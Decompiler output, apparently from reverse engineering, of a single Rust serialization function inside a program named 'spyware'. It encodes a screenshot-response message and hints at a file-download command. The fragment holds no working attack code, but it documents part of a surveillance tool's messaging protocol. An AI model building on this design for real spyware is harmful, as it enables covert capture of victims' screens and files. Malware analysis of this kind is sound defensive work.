
  fn spyware::communication::messages::_::_$LT$impl$u20$serde..ser..Serialize$u20$for$u20$spyware..communication..messages..GetScreenshotResponse$GT$::serialize::h248e03f41e757f8a(arg1: *mut i32, arg2: *mut c_void, arg3: *mut i64) -> *mut i32

{
    let mut var_50: i32;
    _$LT$$RF$mut$u20$ron..ser..Serializer$LT$W$GT$$u20$as$u20$serde..ser..Serializer$GT$::serialize_struct::h19528d03ac3c512b(&var_50, arg3, "GetScreenshotResponsedisplays_sc…", 0x15, 2);
    let rax: i32 = var_50;
    let var_48: *mut i64;
    let var_40: i8;
    let var_30: i128;
    
    if rax != 0x21
    {
        *arg1.byte_offset(0x20) = var_30;
        let var_3f: i128;
        *arg1.byte_offset(0x11) = var_3f;
        *arg1 = rax;
        let var_4c: i32;
        arg1[1] = var_4c;
        *arg1.byte_offset(8) = var_48;
        arg1[4] = var_40;
    }
    else
    {
        let mut var_20: *mut i64 = var_48;
        _$LT$ron..ser..Compound$LT$W$GT$$u20$as$u20$serde..ser..SerializeStruct$GT$::serialize_field::h3f6deb8818138b6c(&var_50, &var_20, "displays_screenshotsMessage", 0x14, arg2);
        
        if var_50 != 0x21
        {
            'label_45069c:
            let zmm0_2: i128 = var_50;
            *arg1.byte_offset(0x20) = var_30;
            *arg1.byte_offset(0x10) = var_40;
            *arg1 = zmm0_2;
        }
        else
        {
            _$LT$ron..ser..Compound$LT$W$GT$$u20$as$u20$serde..ser..SerializeStruct$GT$::serialize_field::h2397a223b27dc649(&var_50, &var_20, "error_infoDownloadFileRequestDow…", 0xa, arg2.byte_offset(0x18));
            
            if var_50 != 0x21
            {
                goto 'label_45069c;
            }
            
            _$LT$ron..ser..Compound$LT$W$GT$$u20$as$u20$serde..ser..SerializeStruct$GT$::end::h1114ba35daa4ac40(arg1, var_20, var_40);
        }
    }
    arg1
}
